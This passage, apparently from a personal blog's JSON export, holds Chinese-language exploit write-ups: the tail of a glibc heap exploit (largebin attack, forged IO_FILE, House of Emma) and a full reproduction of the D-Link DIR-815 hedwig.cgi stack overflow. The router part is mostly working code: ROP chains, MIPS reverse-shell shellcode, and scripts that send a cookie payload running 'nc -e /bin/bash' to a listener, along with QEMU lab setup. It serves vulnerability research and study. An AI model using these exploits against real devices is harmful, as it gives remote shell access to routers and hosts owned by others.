class=\"line\">edit(<span class=\"number\">2</span>, p64(heap_base + <span class=\"number\">0x22a0</span>) + p64(libc_base + <span class=\"number\">0x1f30b0</span>) + p64(heap_base + <span class=\"number\">0x22a0</span>) * <span class=\"number\">2</span>)</span><br><span class=\"line\">edit(<span class=\"number\">0</span>, p64(libc_base + <span class=\"number\">0x1f30b0</span>) + p64(heap_base + <span class=\"number\">0x2ae0</span>) * <span class=\"number\">3</span>)</span><br><span class=\"line\">add(<span class=\"number\">0</span>, <span class=\"number\">0x410</span>)</span><br><span class=\"line\">add(<span class=\"number\">2</span>, <span class=\"number\">0x420</span>)</span><br><span class=\"line\">run()   </span><br><span class=\"line\"><span class=\"comment\">#----------------------------------largebin attack guard , TLS 地址偏移不固定，直接手改吧</span></span><br><span class=\"line\">delete(<span class=\"number\">2</span>)</span><br><span class=\"line\">add(<span class=\"number\">6</span>,<span class=\"number\">0x430</span>)</span><br><span class=\"line\">delete(<span class=\"number\">0</span>)</span><br><span class=\"line\">edit(<span class=\"number\">2</span>, p64(libc_base + <span class=\"number\">0x1f30b0</span>) * <span class=\"number\">2</span> + p64(heap_base + <span class=\"number\">0x2ae0</span>) + p64(guard - <span class=\"number\">0x20</span>))</span><br><span class=\"line\">add(<span class=\"number\">7</span>, <span class=\"number\">0x450</span>)</span><br><span class=\"line\">edit(<span class=\"number\">2</span>, p64(heap_base + <span class=\"number\">0x22a0</span>) + p64(libc_base + <span class=\"number\">0x1f30b0</span>) + p64(heap_base + <span class=\"number\">0x22a0</span>) * <span class=\"number\">2</span>)</span><br><span class=\"line\">edit(<span class=\"number\">0</span>, p64(libc_base + <span class=\"number\">0x1f30b0</span>) + p64(heap_base + <span class=\"number\">0x2ae0</span>) * <span class=\"number\">3</span>)</span><br><span class=\"line\">add(<span class=\"number\">2</span>, <span class=\"number\">0x420</span>)</span><br><span class=\"line\">add(<span class=\"number\">0</span>, <span class=\"number\">0x410</span>)</span><br><span class=\"line\">run()</span><br><span class=\"line\">delete(<span class=\"number\">7</span>)</span><br><span class=\"line\">add(<span class=\"number\">8</span>, <span class=\"number\">0x430</span>)</span><br><span class=\"line\">edit(<span class=\"number\">7</span>,<span class=\"string\">b&#x27;a&#x27;</span> * <span class=\"number\">0x438</span> + p64(<span class=\"number\">0x300</span>))</span><br><span class=\"line\">run()</span><br><span class=\"line\"><span class=\"comment\">#----------------------------------写 orw</span></span><br><span class=\"line\">flag = heap_base + <span class=\"number\">0x22a0</span> + <span class=\"number\">0x260</span></span><br><span class=\"line\">orw = p64(pop_rdi)+p64(flag)</span><br><span class=\"line\">orw+= p64(pop_rsi)+p64(<span class=\"number\">0</span>)</span><br><span class=\"line\">orw+= p64(pop_rax)+p64(<span class=\"number\">2</span>)</span><br><span class=\"line\">orw+= p64(syscall)</span><br><span class=\"line\"></span><br><span class=\"line\">orw+= p64(pop_rdi)+p64(<span class=\"number\">3</span>)</span><br><span class=\"line\">orw+= p64(pop_rsi)+p64(heap_base+<span class=\"number\">0x1050</span>)</span><br><span class=\"line\">orw+= p64(pop_rdx_r12)+p64(<span class=\"number\">0x30</span>)+p64(<span class=\"number\">0</span>)</span><br><span class=\"line\">orw+= p64(read_addr)</span><br><span class=\"line\"></span><br><span class=\"line\">orw+= p64(pop_rdi)+p64(<span class=\"number\">1</span>)</span><br><span class=\"line\">orw+= p64(pop_rsi)+p64(heap_base+<span class=\"number\">0x1050</span>)</span><br><span class=\"line\">orw+= p64(pop_rdx_r12)+p64(<span class=\"number\">0x30</span>)+p64(<span class=\"number\">0</span>)</span><br><span class=\"line\">orw+= p64(write)</span><br><span class=\"line\"><span class=\"comment\">#----------------------------------伪造fake io</span></span><br><span class=\"line\">chunk0 = heap_base + <span class=\"number\">0x22a0</span></span><br><span class=\"line\">gadget = libc_base + <span class=\"number\">0x146020</span>  <span class=\"comment\"># mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20];</span></span><br><span class=\"line\">xor_key = chunk0</span><br><span class=\"line\">fake_io = p64(<span class=\"number\">0</span>) + p64(<span class=\"number\">0</span>) <span class=\"comment\"># IO_read_end IO_read_base</span></span><br><span class=\"line\">fake_io += p64(<span class=\"number\">0</span>) + p64(<span class=\"number\">0</span>) + p64(<span class=\"number\">0</span>) <span class=\"comment\"># IO_write_base IO_write_ptr IO_write_end</span></span><br><span class=\"line\">fake_io += p64(<span class=\"number\">0</span>) + p64(<span class=\"number\">0</span>) <span class=\"comment\"># IO_buf_base IO_buf_end</span></span><br><span class=\"line\">fake_io += p64(<span class=\"number\">0</span>)*<span class=\"number\">8</span> <span class=\"comment\">#_IO_save_base ~ _codecvt</span></span><br><span class=\"line\">fake_io += p64(heap_base) + p64(<span class=\"number\">0</span>)*<span class=\"number\">2</span>  <span class=\"comment\">#_lock   _offset  _codecvt</span></span><br><span class=\"line\">fake_io = fake_io.ljust(<span class=\"number\">0xc8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">fake_io += p64(_IO_cookie_jumps+<span class=\"number\">0x38</span>) <span class=\"comment\">#vtable 0xd8</span></span><br><span class=\"line\">rdi_data = chunk0 + <span class=\"number\">0xf0</span></span><br><span class=\"line\">rdx_data = chunk0 + <span class=\"number\">0xf0</span></span><br><span class=\"line\"></span><br><span class=\"line\">encrypt_gadget = rotate_left_64(gadget^xor_key,<span class=\"number\">0x11</span>)</span><br><span class=\"line\">fake_io += p64(rdi_data) <span class=\"comment\"># 0xe0</span></span><br><span class=\"line\">fake_io += p64(encrypt_gadget) <span class=\"comment\"># 0xe8</span></span><br><span class=\"line\">fake_io += p64(<span class=\"number\">0</span>) + p64(rdx_data) <span class=\"comment\"># 0xf0,0xf8</span></span><br><span class=\"line\">fake_io += p64(<span class=\"number\">0</span>)*<span class=\"number\">2</span> + p64(setcontext + <span class=\"number\">61</span>) <span class=\"comment\">#0x100,0x108,0x110</span></span><br><span class=\"line\">fake_io += p64(<span class=\"number\">0xdeadbeef</span>)</span><br><span class=\"line\">fake_io += <span class=\"string\">b&#x27;a&#x27;</span>*(<span class=\"number\">0xa0</span> - <span class=\"number\">0x30</span>)</span><br><span class=\"line\"><span class=\"comment\"># fake_io += p64(0)*2</span></span><br><span class=\"line\">fake_io += p64(chunk0+<span class=\"number\">0x1a0</span>)+p64(pop_rdi+<span class=\"number\">1</span>)</span><br><span class=\"line\">fake_io += orw</span><br><span class=\"line\">fake_io += p64(<span class=\"number\">0xdeadbeef</span>)</span><br><span class=\"line\">fake_io += <span class=\"string\">b&#x27;flag\\x00\\x00\\x00\\x00&#x27;</span></span><br><span class=\"line\">edit(<span class=\"number\">0</span>,fake_io)</span><br><span class=\"line\">run()</span><br><span class=\"line\"><span class=\"comment\">#---------------------------------- house of emma</span></span><br><span class=\"line\">add(<span class=\"number\">9</span>,<span class=\"number\">0x4c0</span>)</span><br><span class=\"line\">run()</span><br><span class=\"line\"></span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure>"},{"title":"DIR-815 栈溢出漏洞","cover":"/img/罗小黑.png","_content":"# DIR-815 栈溢出漏洞\n\n## 环境工具准备\n\n### sasquatch\n\n```\n# 安装依赖库文件\nsudo apt-get install build-essential liblzma-dev liblzo2-dev zlib1g-dev\n \n# 下载源码\ngit clone https://github.com/devttys0/sasquatch.git\n \n# 源码的编译\n(cd sasquatch && ./build.sh)\n```\n\n### 固件下载\n1. [DIR-815A1_FW101SSB03.bin](https://bbs.kanxue.com/elink@892K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6H3L8h3c8S2M7q4)\n2. [File DIR-815_FIRMWARE_1.01.ZIP — Firmware for D-link DIR-815](https://rebyte.me/en/d-link/89510/file-592084/)\n3. [[下载]D-LINK路由器固件--DIR-815_FIRMWARE_1.01-安全工具-看雪-安全社区|安全招聘|kanxue.com](https://bbs.kanxue.com/thread-273684.htm)\n\n## 解压\n\n ```\n binwalk -Me DIR-815.bin\n ```\n\n## 二进制文件逆向分析\n\n![hedwig.cgi](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250807175447631.png)\n\n可以看见，`/htdocs/web/hedwig.cgi`是`/htdocs/cgibin`的软链接，因此，我们需要逆向分析的二进制文件是`/htdocs/cgibin`\n\n用ida9.0打开cgibin ，开始分析\n\n![main](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250807192849832.png)\n\n在main函数中发现hedwigcgi，进入该函数分析\n\n### hedwigcgi函数分析\n\n![hedwigcgi](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250807193447008.png)\n\n先获取环境环境变量，REQUEST_METHOD,当这个值为POST时，程序继续运行cgibin_parse_request()，进入该函数分析\n\n![hedwigcgi](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250807194034588.png)\n\n发现似乎是解析获取环境变量的，返回上层函数，往下分析\n\n![main](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250807194403775.png)\n\n接下来会执行sess_get_uid()函数，进入函数分析\n\n![sess_get_uid](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250807195355928.png)\n\n![sess_get_uid](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250807210059982.png)\n\n如果v2也就是\"=\"前面的字符串是uid，就会把v4的值返回，返回上层函数继续分析\n\n![main](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250807202727044.png)\n\n这里的string就是处理了uid之后的内容，sprintf 函数存在溢出的可能。\n\n![main](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250807202901421.png)\n\n在函数后面，有个类似的sprinf，而且两个sprintf之间没有对v4 改变，所以v20和string是一样的。v27只有1024个字节大小，所以可以溢出。\n\n![main](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250807213459396.png)\n\n因为haystack默认值为0，所以要控制它为1，才能不进入if。同时上面的路径要存在，否则也会进入if里。如何控制haystack呢？\n\n### haystack变量控制分析\n\n![haystack](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250808144001612.png)\n\n通过交叉引用查看，发现在sub_409A6c中有对该变量的操作， 继续查看该函数的交叉引用\n\n![main](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250808144244466.png)\n\n发现在cgibin_parse_request中有调用\n\n![cgibin_parse_request](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250808151711845.png)\n\n在这里进行了调用，参数是a1是sub_409ac6,\n\n![off_42c014](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250808152204598.png)\n\n这个地址，第一次进循环就正确，此时应该调用的是sub_0x403b10函数，继续\n\n![sub_0x403b10](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250808152327478.png)\n\n调用了sub_402ffc 函数，继续进入分析\n\n![sub_402ffc](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250808152442511.png)\n\n![sub_402ffc](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250808152503518.png)\n\n这里会进一步调用sub_402b40函数，参数&v11，这个地址与我们的v14相邻，而v14被赋值为了关键函数的地址。继续深入分析\n\n![sub_402b40](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250808152908972.png)\n\na1就是刚才的&v11，这里作为Dword指针，v9就是我们的sub_409A6c函数，参数也是刚才保存在栈上的数据。\n\n因此，要执行到有溢出漏洞的地方必须满足**环境变量`REQUEST_URI`中必须有内容**，环境变量`CONTENT_TYPE`仍然是老规矩`application/x-www-form-urlencoded`，要是POST方法\n\n## ROP链构造\n\n### 准备工作\n\n1. 先在var目录下创建一个tmp文件夹\n2. mipsrop下载[[环境搭建 & 工具]]\n\n### 纯ROP\n\n```\nfrom pwn import *\ncontext(os = 'linux', arch = 'mips', log_level = 'debug')\n \nlibc_base = 0x7F738000\n \npayload = b'a'*0x3cd\npayload += p32(libc_base + 0x53200 - 1) # s0  system_addr - 1\npayload += p32(libc_base + 0x159F4) # s1  move $t9, $s0 (=> jalr $t9)\npayload += b'a'*4\npayload += p32(libc_base + 0x6DFD0) # s3  /bin/sh\npayload += b'a'*(4*2)\npayload += p32(libc_base + 0x32A98) # s6  addiu $s0, 1 (=> jalr $s1)\npayload += b'a'*(4*2)\npayload += p32(libc_base + 0x13F8C) # ra  move $a0, $s3 (=> jalr $s6)\n \npayload = b\"uid=\" + payload\npost_content = \"peruy=pwner\"\nio = process(b\"\"\"\n    qemu-mipsel -L ./ \\\n    -0 \"hedwig.cgi\" \\\n    -E REQUEST_METHOD=\"POST\" \\\n    -E CONTENT_LENGTH=11 \\\n    -E CONTENT_TYPE=\"application/x-www-form-urlencoded\" \\\n    -E HTTP_COOKIE=\\\"\"\"\" + payload + b\"\"\"\\\" \\\n    -E REQUEST_URI=\"2333\" \\\n    ./htdocs/cgibin\n\"\"\", shell = True)\nio.send(post_content)\nio.interactive()\n```\n\n### ROP + shellcode\n\n```\nfrom pwn import *\ncontext(os = 'linux', arch = 'mips', log_level = 'debug')\n \nlibc_base = 0x7F738000\n \npayload = b'a'*0x3cd\npayload += b'a'*4\npayload += p32(libc_base + 0x436D0) # s1  move $t9, $s3 (=> lw... => jalr $t9)\npayload += b'a'*4\npayload += p32(libc_base + 0x56BD0) # s3  sleep\npayload += b'a'*(4*5)\npayload += p32(libc_base + 0x57E50) # ra  li $a0, 1 (=> jalr $s1)\n \npayload += b'a'*0x18\npayload += b'a'*(4*4)\npayload += p32(libc_base + 0x37E6C) # s4  move  $t9, $a1 (=> jalr $t9)\npayload += p32(libc_base + 0x3B974) # ra  addiu $a1, $sp, 0x18 (=> jalr $s4)\n \nshellcode = asm('''\n    slti $a2, $zero, -1\n    li $t7, 0x69622f2f\n    sw $t7, -12($sp)\n    li $t6, 0x68732f6e\n    sw $t6, -8($sp)\n    sw $zero, -4($sp)\n    la $a0, -12($sp)\n    slti $a1, $zero, -1\n    li $v0, 4011\n    syscall 0x40404\n''')\npayload += b'a'*0x18\npayload += shellcode\n \npayload = b\"uid=\" + payload\npost_content = \"peruy=pwner\"\nio = process(b\"\"\"\n    qemu-mipsel -L ./ \\\n    -0 \"hedwig.cgi\" \\\n    -E REQUEST_METHOD=\"POST\" \\\n    -E CONTENT_LENGTH=11 \\\n    -E CONTENT_TYPE=\"application/x-www-form-urlencoded\" \\\n    -E HTTP_COOKIE=\\\"\"\"\" + payload + b\"\"\"\\\" \\\n    -E REQUEST_URI=\"2333\" \\\n    ./htdocs/cgibin\n\"\"\", shell = True)\nio.send(post_content)\nio.interactive()\n```\n\n## 虚拟机网络配置\n### ✅ 步骤一：禁用 NetworkManager 对 `eth0` 和 `br0` 的管理\n\n编辑或创建一个配置文件：\n\n\n```bash\nsudo nano /etc/NetworkManager/conf.d/99-unmanaged-devices.conf\n```\n\n添加以下内容：\n\n```ini\n[keyfile]\nunmanaged-devices=interface-name:eth0;interface-name:br0\n```\n\n保存后重启 NetworkManager：\n\n```bash\nsudo systemctl restart NetworkManager\n```\n\n---\n\n### ✅ 步骤二：创建 Netplan 配置文件\n\n备份原来的：\n\n```bash\nsudo mv /etc/netplan/01-network-manager-all.yaml /etc/netplan/01-network-manager-all.yaml.bak\n```\n\n创建新配置：\n\n```bash\nsudo nano /etc/netplan/01-bridge.yaml\n```\n\n内容如下（根据你实际接口名修改，比如 `ens33` 换成 `eth0`）：\n\n\n```yaml\nnetwork:\n  version: 2\n  renderer: networkd\n  ethernets:\n    eth0:\n      dhcp4: no\n  bridges:\n    br0:\n      interfaces: [eth0]\n      dhcp4: yes\n      parameters:\n        stp: false\n        forward-delay: 0\n```\n\n> ⚠️ 注意：  \n> 如果你虚拟机里的接口名是 `ens33` 而不是 `eth0`，请把上面两处 `eth0` 改成 `ens33`。\n\n---\n\n### ✅ 步骤三：应用配置\n\n```bash\nsudo netplan apply\n```\n\n---\n\n### ✅ 验证\n\n```bash\nip addr show br0\nip route\n```\n\n你应该能看到 `br0` 拿到了 DHCP 地址，`eth0` 没有 IP。\n\n## 下载镜像\nhttps://people.debian.org/~aurel32/qemu/mipsel/\n下载其中的`vmlinux-3.2.0-4-4kc-malta`内核以及`debian_squeeze_mipsel_standard.qcow2`镜像文件\n\n## qemu系统下\n\n### 启动脚本\n```\n#!/bin/bash\nsudo qemu-system-mipsel \\\n    -M malta -kernel vmlinux-3.2.0-4-4kc-malta \\\n    -hda debian_squeeze_mipsel_standard.qcow2 \\\n    -append \"root=/dev/sda1 console=tty0\" \\\n    -net nic,macaddr=00:16:3e:00:00:01 \\\n    -net tap\n```\n### http_cond\n\n在qemu 中 /root/squashfs-root/ 下创建\n\n```\nUmask 026\nPIDFile /var/run/httpd.pid\nLogGMT On  #开启log\nErrorLog /log #log文件\n \nTuning\n{\n    NumConnections 15\n    BufSize 12288\n    InputBufSize 4096\n    ScriptBufSize 4096\n    NumHeaders 100\n    Timeout 60\n    ScriptTimeout 60\n}\n \nControl\n{\n    Types\n    {\n        text/html    { html htm }\n        text/xml    { xml }\n        text/plain    { txt }\n        image/gif    { gif }\n        image/jpeg    { jpg }\n        text/css    { css }\n        application/octet-stream { * }\n    }\n    Specials\n    {\n        Dump        { /dump }\n        CGI            { cgi }\n        Imagemap    { map }\n        Redirect    { url }\n    }\n    External\n    {\n        /usr/sbin/phpcgi { php }\n    }\n}\n \n \nServer\n{\n    ServerName \"Linux, HTTP/1.1, \"\n    ServerId \"1234\"\n    Family inet\n    Interface eth1 #对应qemu仿真路由器系统的网卡\n    Address 192.168.225.129 #qemu仿真路由器系统的IP\n    Port \"1234\" #对应未被使用的端口\n    Virtual\n    {\n        AnyHost\n        Control\n        {\n            Alias /\n            Location /htdocs/web\n            IndexNames { index.php }\n            External\n            {\n                /usr/sbin/phpcgi { router_info.xml }\n                /usr/sbin/phpcgi { post_login.xml }\n            }\n        }\n        Control\n        {\n            Alias /HNAP1\n            Location /htdocs/HNAP1\n            External\n            {\n                /usr/sbin/hnap { hnap }\n            }\n            IndexNames { index.hnap }\n        }\n    }\n}\n```\n\n### net.sh\n\n物理机上运行\n\n```\n#! /bin/sh\nsudo sysctl -w net.ipv4.ip_forward=1\nsudo iptables -F\nsudo iptables -X\nsudo iptables -t nat -F\nsudo iptables -t nat -X\nsudo iptables -t mangle -F\nsudo iptables -t mangle -X\nsudo iptables -P INPUT ACCEPT\nsudo iptables -P FORWARD ACCEPT\nsudo iptables -P OUTPUT ACCEPT\nsudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE\nsudo iptables -I FORWARD 1 -i tap0 -j ACCEPT\nsudo iptables -I FORWARD 1 -o tap0 -m state --state RELATED,ESTABLISHED -j ACCEPT\n```\n\n### init.sh\n\n在qemu中squashfs-root下创建\n\n```\n#!/bin/bash\necho 0 > /proc/sys/kernel/randomize_va_space\ncp http_conf /\ncp sbin/httpd /\ncp -rf htdocs/ /\nmkdir /etc_bak\ncp -r /etc /etc_bak\nrm /etc/services\ncp -rf etc/ /\ncp lib/ld-uClibc-0.9.30.1.so  /lib/\ncp lib/libcrypt-0.9.30.1.so  /lib/\ncp lib/libc.so.0  /lib/\ncp lib/libgcc_s.so.1  /lib/\ncp lib/ld-uClibc.so.0  /lib/\ncp lib/libcrypt.so.0  /lib/\ncp lib/libgcc_s.so  /lib/\ncp lib/libuClibc-0.9.30.1.so  /lib/\ncd /\nrm -rf /htdocs/web/hedwig.cgi\nrm -rf /usr/sbin/phpcgi\nrm -rf /usr/sbin/hnap\nln -s /htdocs/cgibin /htdocs/web/hedwig.cgi\nln -s /htdocs/cgibin /usr/sbin/phpcgi\nln -s  /htdocs/cgibin /usr/sbin/hnap\n./httpd -f http_conf\n```\n\n### fin.sh\n\nqemu中squashfs-root下创建，退出时运行\n\n```\n#!/bin/bash\nrm -rf /etc\nmv /etc_bak/etc /etc\nrm -rf /etc_bak\n```\n\n\n\n### 开启服务\n\n![访问网站](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250810194723866.png)\n\n### run.sh\n```\n#!/bin/bash\nexport CONTENT_LENGTH=\"11\"\nexport CONTENT_TYPE=\"application/x-www-form-urlencoded\"\nexport HTTP_COOKIE=\"uid=`cat payload`\"\nexport REQUEST_METHOD=\"POST\"\nexport REQUEST_URI=\"2333\"\necho \"peruy=pwner\"|./gdbserver.mipsle 192.168.225.154:6666 /htdocs/web/hedwig.cgi\n#echo \"winmt=pwner\"|/htdocs/web/hedwig.cgi\nunset CONTENT_LENGTH\nunset CONTENT_TYPE\nunset HTTP_COOKIE\nunset REQUEST_METHOD\nunset REQUEST_URI\n```\n\n### 查找libc 和 偏移\n\n![qemu调试](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250810220153748.png)\n\n### 发送payload\n\n![打通](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250810221044091.png)\n\n## EXP\n\n### 直接发payload\n\n#### ROP链\n\n```python\nfrom pwn import *\ncontext(os = 'linux', arch = 'mips', log_level = 'debug')\n \ncmd = b'nc -e /bin/bash 192.168.192.128 8888'\n \nlibc_base = 0x77f34000\n \npayload = b'a'*0x3cd\npayload += p32(libc_base + 0x53200 - 1) # s0  system_addr - 1\npayload += p32(libc_base + 0x169C4) # s1  addiu $s2, $sp, 0x18 (=> jalr $s0)\npayload += b'a'*(4*7)\npayload += p32(libc_base + 0x32A98) # ra  addiu $s0, 1 (=> jalr $s1)\npayload += b'a'*0x18\npayload += cmd\n \nfd = open(\"payload\", \"wb\")\nfd.write(payload)\nfd.close()\n```\n\n#### ROP+shellcode\n\n```python\nfrom pwn import *\ncontext(os = 'linux', arch = 'mips', log_level = 'debug')\n \nlibc_base = 0x77f34000\n \npayload = b'a'*0x3cd\npayload += b'a'*4\npayload += p32(libc_base + 0x436D0) # s1  move $t9, $s3 (=> lw... => jalr $t9)\npayload += b'a'*4\npayload += p32(libc_base + 0x56BD0) # s3  sleep\npayload += b'a'*(4*5)\npayload += p32(libc_base + 0x57E50) # ra  li $a0, 1 (=> jalr $s1)\n \npayload += b'a'*0x18\npayload += b'a'*(4*4)\npayload += p32(libc_base + 0x37E6C) # s4  move  $t9, $a1 (=> jalr $t9)\npayload += p32(libc_base + 0x3B974) # ra  addiu $a1, $sp, 0x18 (=> jalr $s4)\n \nshellcode = asm('''\n    slti $a0, $zero, 0xFFFF\n    li $v0, 4006\n    syscall 0x42424\n \n    slti $a0, $zero, 0x1111\n    li $v0, 4006\n    syscall 0x42424\n \n    li $t4, 0xFFFFFFFD\n    not $a0, $t4\n    li $v0, 4006\n    syscall 0x42424\n \n    li $t4, 0xFFFFFFFD\n    not $a0, $t4\n    not $a1, $t4\n    slti $a2, $zero, 0xFFFF\n    li $v0, 4183\n    syscall 0x42424\n \n    andi $a0, $v0, 0xFFFF\n    li $v0, 4041\n    syscall 0x42424\n    li $v0, 4041\n    syscall 0x42424\n \n    lui $a1, 0xB821 # Port: 8888\n    ori $a1, 0xFF01\n    addi $a1, $a1, 0x0101\n    sw $a1, -8($sp)\n \n    li $a1, 0x83C0A8C0 # IP: 192.168.192.131\n    sw $a1, -4($sp)\n    addi $a1, $sp, -8\n \n    li $t4, 0xFFFFFFEF\n    not $a2, $t4\n    li $v0, 4170\n    syscall 0x42424\n \n    lui $t0, 0x6962\n    ori $t0, $t0,0x2f2f\n    sw $t0, -20($sp)\n \n    lui $t0, 0x6873\n    ori $t0, 0x2f6e\n    sw $t0, -16($sp)\n \n    slti $a3, $zero, 0xFFFF\n    sw $a3, -12($sp)\n    sw $a3, -4($sp)\n \n    addi $a0, $sp, -20\n    addi $t0, $sp, -20\n    sw $t0, -8($sp)\n    addi $a1, $sp, -8\n \n    addiu $sp, $sp, -20\n \n    slti $a2, $zero, 0xFFFF\n    li $v0, 4011\n    syscall 0x42424\n''')\npayload += b'a'*0x18\npayload += shellcode\n \nfd = open(\"payload\", \"wb\")\nfd.write(payload)\nfd.close()\n```\n\n### 通过http报文\n\n#### ROP链\n\n```python\nfrom pwn import *\nimport requests\ncontext(os = 'linux', arch = 'mips', log_level = 'debug')\n \ncmd = b'nc -e /bin/bash 192.168.225.128 8888'\n \nlibc_base = 0x77f34000\n \npayload = b'a'*0x3cd\npayload += p32(libc_base + 0x53200 - 1) # s0  system_addr - 1\npayload += p32(libc_base + 0x169C4) # s1  addiu $s2, $sp, 0x18 (=> jalr $s0)\npayload += b'a'*(4*7)\npayload += p32(libc_base + 0x32A98) # ra  addiu $s0, 1 (=> jalr $s1)\npayload += b'a'*0x18\npayload += cmd\n \nurl = \"http://192.168.225.129:1234/hedwig.cgi\"\ndata = {\"winmt\" : \"pwner\"}\nheaders = {\n    \"Cookie\"        : b\"uid=\" + payload,\n    \"Content-Type\"  : \"application/x-www-form-urlencoded\",\n    \"Content-Length\": \"11\"\n}\nres = requests.post(url = url, headers = headers, data = data)\nprint(res)\n```\n\n#### ROP链+shellcode\n\n```python\nfrom pwn import *\nimport requests\ncontext(os = 'linux', arch = 'mips', log_level = 'debug')\n \nlibc_base = 0x77f34000\n \npayload = b'a'*0x3cd\npayload += b'a'*4\npayload += p32(libc_base + 0x436D0) # s1  move $t9, $s3 (=> lw... => jalr $t9)\npayload += b'a'*4\npayload += p32(libc_base + 0x56BD0) # s3  sleep\npayload += b'a'*(4*5)\npayload += p32(libc_base + 0x57E50) # ra  li $a0, 1 (=> jalr $s1)\n \npayload += b'a'*0x18\npayload += b'a'*(4*4)\npayload += p32(libc_base + 0x37E6C) # s4  move  $t9, $a1 (=> jalr $t9)\npayload += p32(libc_base + 0x3B974) # ra  addiu $a1, $sp, 0x18 (=> jalr $s4)\n \nshellcode = asm('''\n    slti $a0, $zero, 0xFFFF\n    li $v0, 4006\n    syscall 0x42424\n \n    slti $a0, $zero, 0x1111\n    li $v0, 4006\n    syscall 0x42424\n \n    li $t4, 0xFFFFFFFD\n    not $a0, $t4\n    li $v0, 4006\n    syscall 0x42424\n \n    li $t4, 0xFFFFFFFD\n    not $a0, $t4\n    not $a1, $t4\n    slti $a2, $zero, 0xFFFF\n    li $v0, 4183\n    syscall 0x42424\n \n    andi $a0, $v0, 0xFFFF\n    li $v0, 4041\n    syscall 0x42424\n    li $v0, 4041\n    syscall 0x42424\n \n    lui $a1, 0xB821 # Port: 8888\n    ori $a1, 0xFF01\n    addi $a1, $a1, 0x0101\n    sw $a1, -8($sp)\n \n    li $a1, 0x83C0A8C0 # IP: 192.168.192.131\n    sw $a1, -4($sp)\n    addi $a1, $sp, -8\n \n    li $t4, 0xFFFFFFEF\n    not $a2, $t4\n    li $v0, 4170\n    syscall 0x42424\n \n    lui $t0, 0x6962\n    ori $t0, $t0,0x2f2f\n    sw $t0, -20($sp)\n \n    lui $t0, 0x6873\n    ori $t0, 0x2f6e\n    sw $t0, -16($sp)\n \n    slti $a3, $zero, 0xFFFF\n    sw $a3, -12($sp)\n    sw $a3, -4($sp)\n \n    addi $a0, $sp, -20\n    addi $t0, $sp, -20\n    sw $t0, -8($sp)\n    addi $a1, $sp, -8\n \n    addiu $sp, $sp, -20\n \n    slti $a2, $zero, 0xFFFF\n    li $v0, 4011\n    syscall 0x42424\n''')\npayload += b'a'*0x18\npayload += shellcode\n \nurl = \"http://192.168.192.133:1234/hedwig.cgi\"\ndata = {\"winmt\" : \"pwner\"}\nheaders = {\n    \"Cookie\"        : b\"uid=\" + payload,\n    \"Content-Type\"  : \"application/x-www-form-urlencoded\",\n    \"Content-Length\": \"11\"\n}\nres = requests.post(url = url, headers = headers, data = data)\nprint(res)\n```\n\n我在这里并没有把4个exp 都打完，我只打了发报文的纯ROP链。shellcode 的exp，懒得改ip 地址了\n\n## 参考文章\n\n[[原创] 从零开始复现 DIR-815 栈溢出漏洞-二进制漏洞-看雪-安全社区|安全招聘|kanxue.com](https://bbs.kanxue.com/thread-272318.htm#msg_header_h2_3)","source":"_posts/Iot/DIR-815 栈溢出漏洞.md","raw":"---\ntitle: DIR-815 栈溢出漏洞\ntags: \n  - 漏洞复现\n  - iot\ncategories: \n  - iot\ncover: /img/罗小黑.png\n---\n# DIR-815 栈溢出漏洞\n\n## 环境工具准备\n\n### sasquatch\n\n```\n# 安装依赖库文件\nsudo apt-get install build-essential liblzma-dev liblzo2-dev zlib1g-dev\n \n# 下载源码\ngit clone https://github.com/devttys0/sasquatch.git\n \n# 源码的编译\n(cd sasquatch && ./build.sh)\n```\n\n### 固件下载\n1. [DIR-815A1_FW101SSB03.bin](https://bbs.kanxue.com/elink@892K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6H3L8h3c8S2M7q4)\n2. [File DIR-815_FIRMWARE_1.01.ZIP — Firmware for D-link DIR-815](https://rebyte.me/en/d-link/89510/file-592084/)\n3. [[下载]D-LINK路由器固件--DIR-815_FIRMWARE_1.01-安全工具-看雪-安全社区|安全招聘|kanxue.com](https://bbs.kanxue.com/thread-273684.htm)\n\n## 解压\n\n ```\n binwalk -Me DIR-815.bin\n ```\n\n## 二进制文件逆向分析\n\n![hedwig.cgi](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250807175447631.png)\n\n可以看见，`/htdocs/web/hedwig.cgi`是`/htdocs/cgibin`的软链接，因此，我们需要逆向分析的二进制文件是`/htdocs/cgibin`\n\n用ida9.0打开cgibin ，开始分析\n\n![main](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250807192849832.png)\n\n在main函数中发现hedwigcgi，进入该函数分析\n\n### 